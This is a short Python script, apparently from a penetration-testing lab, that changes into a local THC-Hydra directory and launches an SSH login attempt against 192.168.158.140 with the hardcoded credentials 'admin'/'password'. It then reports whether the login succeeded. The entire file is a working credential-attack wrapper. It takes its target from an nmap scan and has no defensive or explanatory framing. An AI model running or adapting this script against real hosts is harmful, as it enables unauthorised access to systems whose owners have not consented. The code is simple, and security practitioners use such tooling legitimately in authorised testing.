import os
import subprocess

target = "192.168.158.140" # Take from nmap scan
port = 22
username = "admin"
password = "password"

hydra_dir = r"C:\Users\Ivan\Downloads\thc-hydra-windows-master"  # Replace with the path to hydra.exe on user's system

try:
    # cd to hydra.exe directory
    os.chdir(hydra_dir)

    command = [
        "./hydra", "-l", username, "-p", password, f"ssh://{target}:{port}",
    ]

    # Run hydra and capture both stdout and stderr
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    stdout, stderr = process.communicate()

    output = stdout + stderr
    print(output)

    # Check if output contains successful login message
    if "login successful" in output.lower():
        print("Login successful!")
    else:
        print("Login failed.")
except FileNotFoundError:
    print("Hydra command not found. Make sure the path to the Hydra application directory is correct.")
except subprocess.CalledProcessError as e:
    print(f"Hydra command execution failed with error:\n{e}")
